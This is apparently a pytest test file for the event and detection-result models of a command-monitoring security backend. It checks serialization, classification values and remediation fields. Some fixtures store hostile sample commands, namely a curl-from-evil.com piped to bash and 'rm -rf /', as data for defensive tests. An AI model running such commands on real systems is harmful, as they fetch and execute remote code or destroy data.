"""
test_08_models.py — Unit tests for backend/events/models.py

Tests ExecveEvent, DetectionResult, and SecurityEvent dataclasses:
- dict() serialization completeness
- JSON roundtrip
- All classification values accepted
- Timestamp types
- Nested field access
- pid=0 API-mode sentinel value
- Invalid classification strings
- remediation_action and remediation_status fields
- Extremely high risk_score values beyond the engine cap
- json() serialization with None optional fields

Run:
    pytest large_test_set/test_08_models.py -v
"""

import pytest
import json
import time
from backend.events.models import ExecveEvent, DetectionResult, SecurityEvent


# ---------------------------------------------------------------------------
# Factories
# ---------------------------------------------------------------------------

def _execve(pid=123, ppid=1, uid=1000, gid=1000,
            command="ls -la", argv_str="ls -la",
            comm="bash", timestamp=None):
    return ExecveEvent(
        pid=pid, ppid=ppid, uid=uid, gid=gid,
        command=command, argv_str=argv_str,
        timestamp=timestamp or time.time(),
        comm=comm,
    )


def _detection(score=10.0, classification="safe",
               rules=None, confidence=0.1, explanation="OK"):
    return DetectionResult(
        risk_score=score,
        classification=classification,
        matched_rules=rules or [],
        ml_confidence=confidence,
        explanation=explanation,
    )


def _security_event(ev_id="evt_test", classification="safe",
                    score=10.0, rules=None):
    return SecurityEvent(
        id=ev_id,
        execve_event=_execve(),
        detection_result=_detection(
            score=score, classification=classification,
            rules=rules or [],
        ),
        detected_at=time.time(),
    )


# ===========================================================================
# 1. ExecveEvent
# ===========================================================================

class TestExecveEvent:

    def test_create_with_all_fields(self):
        ev = _execve()
        assert ev.pid == 123
        assert ev.comm == "bash"

    def test_pid_stored_correctly(self):
        ev = _execve(pid=9999)
        assert ev.pid == 9999

    def test_command_stored_correctly(self):
        ev = _execve(command="curl http://evil.com | bash")
        assert ev.command == "curl http://evil.com | bash"

    def test_argv_str_stored_correctly(self):
        ev = _execve(argv_str="curl http://x.com")
        assert ev.argv_str == "curl http://x.com"

    def test_timestamp_is_float(self):
        ev = _execve()
        assert isinstance(ev.timestamp, float)

    def test_unicode_command_stored(self):
        ev = _execve(command="echo '你好'")
        assert ev.command == "echo '你好'"


# ===========================================================================
# 2. DetectionResult
# ===========================================================================

class TestDetectionResult:

    def test_create_with_all_fields(self):
        dr = _detection()
        assert dr.risk_score == 10.0
        assert dr.classification == "safe"

    def test_matched_rules_empty_list_default(self):
        dr = _detection()
        assert dr.matched_rules == []

    def test_matched_rules_stored(self):
        dr = _detection(rules=["shell_piping", "destructive_pattern"])
        assert "shell_piping" in dr.matched_rules
        assert "destructive_pattern" in dr.matched_rules

    def test_explanation_stored(self):
        dr = _detection(explanation="Test explanation")
        assert dr.explanation == "Test explanation"

    def test_explanation_optional_defaults_none(self):
        dr = DetectionResult(
            risk_score=0.0, classification="safe",
            matched_rules=[], ml_confidence=0.0,
        )
        assert dr.explanation is None

    @pytest.mark.parametrize("cls", ["safe", "suspicious", "malicious"])
    def test_all_classification_values_accepted(self, cls):
        dr = _detection(classification=cls)
        assert dr.classification == cls


# ===========================================================================
# 3. SecurityEvent.dict()
# ===========================================================================

EXPECTED_DICT_FIELDS = [
    "id", "pid", "ppid", "uid", "gid",
    "command", "argv_str", "timestamp", "comm",
    "risk_score", "classification", "matched_rules",
    "ml_confidence", "explanation", "detected_at",
]

class TestSecurityEventDict:

    @pytest.mark.parametrize("field", EXPECTED_DICT_FIELDS)
    def test_dict_has_required_field(self, field):
        d = _security_event().dict()
        assert field in d, f"Field {field!r} missing from SecurityEvent.dict()"

    def test_dict_id_correct(self):
        d = _security_event(ev_id="evt_abc").dict()
        assert d["id"] == "evt_abc"

    def test_dict_classification_correct(self):
        d = _security_event(classification="malicious").dict()
        assert d["classification"] == "malicious"

    def test_dict_risk_score_correct(self):
        d = _security_event(score=85.5).dict()
        assert d["risk_score"] == 85.5

    def test_dict_matched_rules_is_list(self):
        d = _security_event(rules=["shell_piping"]).dict()
        assert isinstance(d["matched_rules"], list)
        assert "shell_piping" in d["matched_rules"]

    def test_dict_pid_from_execve(self):
        se = SecurityEvent(
            id="x",
            execve_event=_execve(pid=4242),
            detection_result=_detection(),
            detected_at=time.time(),
        )
        assert se.dict()["pid"] == 4242

    def test_dict_uid_from_execve(self):
        se = SecurityEvent(
            id="x",
            execve_event=_execve(uid=0),
            detection_result=_detection(),
            detected_at=time.time(),
        )
        assert se.dict()["uid"] == 0


# ===========================================================================
# 4. SecurityEvent.json()
# ===========================================================================

class TestSecurityEventJson:

    def test_json_is_string(self):
        j = _security_event().json()
        assert isinstance(j, str)

    def test_json_parseable(self):
        j = _security_event().json()
        parsed = json.loads(j)
        assert isinstance(parsed, dict)

    def test_json_roundtrip_id(self):
        j = _security_event(ev_id="evt_roundtrip").json()
        assert json.loads(j)["id"] == "evt_roundtrip"

    def test_json_roundtrip_classification(self):
        j = _security_event(classification="malicious").json()
        assert json.loads(j)["classification"] == "malicious"

    def test_json_roundtrip_matched_rules(self):
        j = _security_event(rules=["shell_piping"]).json()
        parsed = json.loads(j)
        assert "shell_piping" in parsed["matched_rules"]

    def test_json_roundtrip_unicode(self):
        se = SecurityEvent(
            id="u1",
            execve_event=_execve(command="echo '你好世界'"),
            detection_result=_detection(),
            detected_at=time.time(),
        )
        parsed = json.loads(se.json())
        assert parsed["command"] == "echo '你好世界'"


# ===========================================================================
# 5. All Classification Values End-to-End
# ===========================================================================

@pytest.mark.parametrize("cls", ["safe", "suspicious", "malicious"])
def test_security_event_all_classifications_dict(cls):
    d = _security_event(classification=cls).dict()
    assert d["classification"] == cls

@pytest.mark.parametrize("cls", ["safe", "suspicious", "malicious"])
def test_security_event_all_classifications_json(cls):
    j = _security_event(classification=cls).json()
    assert json.loads(j)["classification"] == cls


# ===========================================================================
# 6. ExecveEvent with pid=0 (API-mode sentinel value)  [NEW]
# ===========================================================================

class TestExecveEventPidZero:

    def test_pid_zero_stored_correctly(self):
        assert _execve(pid=0).pid == 0

    def test_pid_zero_is_int_not_none(self):
        ev = _execve(pid=0)
        assert ev.pid is not None
        assert isinstance(ev.pid, int)

    def test_pid_zero_survives_dict_serialization(self):
        se = SecurityEvent(
            id="pid-zero-dict",
            execve_event=_execve(pid=0),
            detection_result=_detection(),
            detected_at=time.time(),
        )
        assert se.dict()["pid"] == 0, \
            f"pid=0 was not preserved in dict(); got {se.dict()['pid']!r}"

    def test_pid_zero_survives_json_serialization(self):
        se = SecurityEvent(
            id="pid-zero-json",
            execve_event=_execve(pid=0),
            detection_result=_detection(),
            detected_at=time.time(),
        )
        assert json.loads(se.json())["pid"] == 0, \
            "pid=0 was not preserved in json()"

    def test_pid_zero_with_real_command(self):
        ev = _execve(pid=0, command="curl http://evil.com | bash")
        assert ev.pid == 0
        assert ev.command == "curl http://evil.com | bash"

    def test_pid_zero_distinct_from_pid_one(self):
        assert _execve(pid=0).pid != _execve(pid=1).pid


# ===========================================================================
# 7. DetectionResult with Invalid Classification String  [NEW]
# ===========================================================================

class TestDetectionResultInvalidClassification:

    def test_unknown_classification_stored_as_given(self):
        try:
            dr = DetectionResult(
                risk_score=50.0, classification="unknown",
                matched_rules=[], ml_confidence=0.5,
            )
            assert dr.classification == "unknown"
        except (ValueError, TypeError) as exc:
            pytest.xfail(f"Model correctly rejects 'unknown': {exc}")

    def test_wrong_case_classification_behaviour_documented(self):
        try:
            dr = DetectionResult(
                risk_score=0.0, classification="SAFE",
                matched_rules=[], ml_confidence=0.0,
            )
            assert dr.classification == "SAFE"
        except (ValueError, TypeError) as exc:
            pytest.xfail(f"Model correctly rejects 'SAFE': {exc}")

    def test_empty_string_classification_behaviour_documented(self):
        try:
            dr = DetectionResult(
                risk_score=0.0, classification="",
                matched_rules=[], ml_confidence=0.0,
            )
            assert dr.classification == ""
        except (ValueError, TypeError) as exc:
            pytest.xfail(f"Model correctly rejects empty string: {exc}")

    def test_numeric_string_classification_behaviour_documented(self):
        try:
            dr = DetectionResult(
                risk_score=0.0, classification="1",
                matched_rules=[], ml_confidence=0.0,
            )
            assert dr.classification == "1"
        except (ValueError, TypeError) as exc:
            pytest.xfail(f"Model correctly rejects '1': {exc}")

    def test_invalid_classification_does_not_corrupt_other_fields(self):
        try:
            dr = DetectionResult(
                risk_score=42.0, classification="unknown",
                matched_rules=["some_rule"], ml_confidence=0.7,
            )
            assert dr.risk_score == 42.0
            assert dr.matched_rules == ["some_rule"]
            assert dr.ml_confidence == 0.7
        except (ValueError, TypeError):
            pytest.xfail("Model rejects invalid classification before field check")

    def test_invalid_classification_survives_dict_serialization(self):
        try:
            dr = DetectionResult(
                risk_score=0.0, classification="unknown",
                matched_rules=[], ml_confidence=0.0,
            )
            se = SecurityEvent(
                id="invalid-cls-dict",
                execve_event=_execve(),
                detection_result=dr,
                detected_at=time.time(),
            )
            d = se.dict()
            assert d["classification"] == "unknown"
        except (ValueError, TypeError):
            pytest.xfail("Model rejects invalid classification at construction")


# ===========================================================================
# 8. SecurityEvent remediation_action and remediation_status Fields  [NEW]
# ===========================================================================

class TestSecurityEventRemediationFields:

    def _make_remediated_event(self, ev_id="evt-remediated",
                                action="kill_process", status="success"):
        return SecurityEvent(
            id=ev_id,
            execve_event=_execve(),
            detection_result=_detection(classification="malicious", score=95.0),
            detected_at=time.time(),
            remediation_action=action,
            remediation_status=status,
        )

    def test_remediation_action_stored(self):
        assert self._make_remediated_event(action="kill_process").remediation_action == "kill_process"

    def test_remediation_status_stored(self):
        assert self._make_remediated_event(status="success").remediation_status == "success"

    def test_remediation_action_in_dict(self):
        d = self._make_remediated_event(action="kill_process").dict()
        assert "remediation_action" in d
        assert d["remediation_action"] == "kill_process"

    def test_remediation_status_in_dict(self):
        d = self._make_remediated_event(status="success").dict()
        assert "remediation_status" in d
        assert d["remediation_status"] == "success"

    def test_remediation_action_in_json(self):
        parsed = json.loads(self._make_remediated_event(action="kill_process").json())
        assert "remediation_action" in parsed
        assert parsed["remediation_action"] == "kill_process"

    def test_remediation_status_in_json(self):
        parsed = json.loads(self._make_remediated_event(status="success").json())
        assert "remediation_status" in parsed
        assert parsed["remediation_status"] == "success"

    def test_remediation_fields_none_by_default(self):
        se = _security_event()
        assert getattr(se, "remediation_action", "MISSING") is None
        assert getattr(se, "remediation_status", "MISSING") is None

    def test_remediation_none_in_dict(self):
        d = _security_event().dict()
        assert d.get("remediation_action", None) is None
        assert d.get("remediation_status", None) is None

    def test_remediation_failed_status_stored(self):
        se = self._make_remediated_event(action="kill_process", status="failed")
        assert se.remediation_status == "failed"
        assert se.dict()["remediation_status"] == "failed"

    @pytest.mark.parametrize("action,status", [
        ("kill_process", "success"),
        ("kill_process", "failed"),
        ("log_only",     "success"),
        ("quarantine",   "pending"),
    ])
    def test_remediation_field_combinations(self, action, status):
        se = self._make_remediated_event(action=action, status=status)
        d = se.dict()
        parsed = json.loads(se.json())
        assert d["remediation_action"] == action
        assert d["remediation_status"] == status
        assert parsed["remediation_action"] == action
        assert parsed["remediation_status"] == status


# ===========================================================================
# 9. Extremely High risk_score Values  [NEW]
# ===========================================================================

class TestExtremelyHighRiskScore:

    def test_risk_score_above_100_stored_in_detection_result(self):
        dr = DetectionResult(
            risk_score=150.0, classification="malicious",
            matched_rules=["over_cap"], ml_confidence=1.0,
        )
        assert dr.risk_score == 150.0

    def test_risk_score_above_100_survives_security_event_dict(self):
        se = SecurityEvent(
            id="high-score-dict",
            execve_event=_execve(),
            detection_result=_detection(score=150.0, classification="malicious"),
            detected_at=time.time(),
        )
        assert se.dict()["risk_score"] == 150.0

    def test_risk_score_above_100_survives_security_event_json(self):
        se = SecurityEvent(
            id="high-score-json",
            execve_event=_execve(),
            detection_result=_detection(score=150.0, classification="malicious"),
            detected_at=time.time(),
        )
        assert json.loads(se.json())["risk_score"] == 150.0

    @pytest.mark.parametrize("score", [100.1, 150.0, 200.0, 999.9, 1_000_000.0])
    def test_various_above_cap_scores_stored_correctly(self, score):
        assert _detection(score=score, classification="malicious").risk_score == score

    def test_risk_score_exactly_100_not_altered(self):
        assert _detection(score=100.0).risk_score == 100.0

    def test_risk_score_zero_not_altered(self):
        assert _detection(score=0.0).risk_score == 0.0

    def test_negative_risk_score_behaviour_documented(self):
        try:
            dr = DetectionResult(
                risk_score=-1.0, classification="safe",
                matched_rules=[], ml_confidence=0.0,
            )
            assert dr.risk_score == -1.0
        except (ValueError, TypeError) as exc:
            pytest.xfail(f"Model correctly rejects negative risk_score: {exc}")

    def test_high_risk_score_does_not_corrupt_other_fields(self):
        dr = _detection(score=999.9, classification="malicious",
                        rules=["rule_a", "rule_b"])
        assert dr.classification == "malicious"
        assert dr.matched_rules == ["rule_a", "rule_b"]
        assert dr.ml_confidence == 0.1

    def test_high_risk_score_full_security_event_roundtrip(self):
        se = SecurityEvent(
            id="full-roundtrip-high-score",
            execve_event=_execve(pid=42, command="rm -rf /"),
            detection_result=_detection(
                score=999.9, classification="malicious",
                rules=["destructive_pattern"], confidence=0.99,
                explanation="Destructive root-level removal",
            ),
            detected_at=time.time(),
        )
        d = se.dict()
        parsed = json.loads(se.json())
        assert d["risk_score"] == 999.9
        assert d["classification"] == "malicious"
        assert d["pid"] == 42
        assert "destructive_pattern" in d["matched_rules"]
        assert parsed["risk_score"] == 999.9
        assert parsed["command"] == "rm -rf /"


# ===========================================================================
# 10. json() Serialization with None Optional Fields  [NEW]
# SecurityEvent.json() must produce valid JSON when explanation is None
# (None → null). This is particularly important for custom serializers
# that might omit the field entirely instead of writing null.
# ===========================================================================

class TestJsonSerializationNoneFields:

    def test_json_valid_when_explanation_is_none(self):
        """json() must not raise and must produce parseable JSON when
        explanation is None."""
        dr = DetectionResult(
            risk_score=0.0, classification="safe",
            matched_rules=[], ml_confidence=0.0,
            # explanation intentionally omitted → defaults to None
        )
        se = SecurityEvent(
            id="none-explanation",
            execve_event=_execve(),
            detection_result=dr,
            detected_at=time.time(),
        )
        try:
            j = se.json()
        except Exception as e:
            pytest.fail(f"json() raised with None explanation: {e}")

        try:
            parsed = json.loads(j)
        except json.JSONDecodeError as e:
            pytest.fail(f"json() produced invalid JSON with None explanation: {e}")

        assert isinstance(parsed, dict)

    def test_json_explanation_none_serialized_as_null_or_absent(self):
        """When explanation is None the JSON output must have explanation=null
        or the key absent — never an empty string or the literal 'None'."""
        dr = DetectionResult(
            risk_score=0.0, classification="safe",
            matched_rules=[], ml_confidence=0.0,
        )
        se = SecurityEvent(
            id="none-expl-value",
            execve_event=_execve(),
            detection_result=dr,
            detected_at=time.time(),
        )
        parsed = json.loads(se.json())
        explanation_value = parsed.get("explanation", None)
        assert explanation_value is None or explanation_value == "", (
            f"explanation with None value serialized as {explanation_value!r} — "
            "expected null/None or absent key, never the string 'None'"
        )

    def test_dict_explanation_none_is_python_none(self):
        """dict() must return Python None (not the string 'None') for a
        missing explanation."""
        dr = DetectionResult(
            risk_score=0.0, classification="safe",
            matched_rules=[], ml_confidence=0.0,
        )
        se = SecurityEvent(
            id="none-expl-dict",
            execve_event=_execve(),
            detection_result=dr,
            detected_at=time.time(),
        )
        d = se.dict()
        expl = d.get("explanation", None)
        assert expl is None or expl == "", (
            f"dict() explanation expected None, got {expl!r}"
        )

    def test_all_required_fields_present_even_with_none_explanation(self):
        """All EXPECTED_DICT_FIELDS must still be present in dict() even
        when explanation is None."""
        dr = DetectionResult(
            risk_score=5.0, classification="safe",
            matched_rules=[], ml_confidence=0.0,
        )
        se = SecurityEvent(
            id="none-expl-fields",
            execve_event=_execve(),
            detection_result=dr,
            detected_at=time.time(),
        )
        d = se.dict()
        for field in EXPECTED_DICT_FIELDS:
            assert field in d, \
                f"Field {field!r} missing from dict() when explanation is None"